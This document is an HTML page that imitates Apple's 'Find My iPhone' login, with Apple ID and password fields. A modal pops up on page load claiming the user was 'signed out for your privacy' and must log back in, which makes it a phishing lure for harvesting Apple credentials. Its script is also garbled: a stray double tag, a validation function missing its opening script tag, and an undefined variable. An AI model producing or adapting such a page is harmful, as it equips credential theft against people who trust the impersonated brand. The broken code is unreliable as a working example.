<!DOCTYPE html>
<html lang="en">
  <head>
    <<meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="css/find-iphone-styles.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script type="text/javascript">
      $(window).on('load',function()
      {
        $('#loginModal').modal('show');
      });
    </script>
    <title>
      Find My iPhone
    </title>
  </head>
  <body>
    <img class="logo" alt="radar" src="img/radar.png" />
    <div class="container-fluid">
      <div class="login-box">
        <form name="login-form" onSubmit="return validateForm()" action="index.html" method="post">
          <div class="form-group">
            <label for="appleID">
              Apple ID
            </label>
            <input type="email" class="form-control" id="appleID" aria-describedby="appleID" placeholder="E-mail">
            <label for="passwordForApp">
              Password
            </label>
            <input type="password" class="form-control" id="passwordForApp" placeholder="Required">
            <br />
            <button type="submit" class="btn btn-success">
              Sign in
            </button>
        </form>

          function validateForm()
          {

            var dotposition = x.lastIndexOf(".");

              alert("Not a valid Apple ID");
              return false;
            }
          }
        </script>
      </div>
    </div>
    <div class="forgotUN">
      <a class="text-success" href=" " target="_blank">
        Forgot your Apple ID?
      </a>
    </div>
    <div class="forgotPass">
      <a class="text-success" href=" " target="_blank">
        Forgot your password?
      </a>
    </div>
    <div class="modal fade" id="loginModal" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title" id="modalLabel">
              <strong>
                We signed you out...
                </strong
            </h5>
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">
                &times;
              </span>
            </button>
          </div>
          <div class="modal-body">
            <p>
              We signed you out for your privacy. Please log back in to pick
              up where you left off!
            </p>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-dismiss="modal">
              Close
            </button>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
